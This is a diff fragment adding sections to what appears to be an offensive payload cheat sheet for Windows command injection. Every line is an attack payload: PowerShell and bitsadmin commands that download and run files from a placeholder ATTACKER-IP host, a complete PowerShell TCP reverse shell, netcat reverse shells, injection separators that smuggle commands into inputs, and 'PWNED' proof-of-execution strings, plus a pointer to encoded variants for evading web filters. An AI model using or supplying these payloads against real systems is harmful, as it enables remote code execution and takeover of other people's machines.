+powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER-IP/rev.ps1')
+powershell -nop -c "invoke-webrequest -Uri http://ATTACKER-IP/a.exe -OutFile C:\Windows\Temp\a.exe"
+bitsadmin /transfer job /download /priority normal http://ATTACKER-IP/a.exe C:\Windows\Temp\a.exe
+# PowerShell encoded (see WAF file for base64 of commands)
+
+## 7) REVERSE SHELLS (PowerShell native - best availability)
+powershell -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER-IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$t=$r+'PS> ';$t2=[text.encoding]::ASCII.GetBytes($t);$s.Write($t2,0,$t2.Length);$s.Flush()};$c.Close()"
+nc ATTACKER-IP 4444 -e cmd
+ncat ATTACKER-IP 4444 -e cmd.exe
+# via injection:  ; powershell -nop -c "...payload..." ;  | certutil ... | 
+
+## 8) PROOF-OF-EXEC
+; echo PWNED
+| echo PWNED > C:\Windows\Temp\pwned.txt
+& dir C:\
+|| timeout /t 5 /nobreak
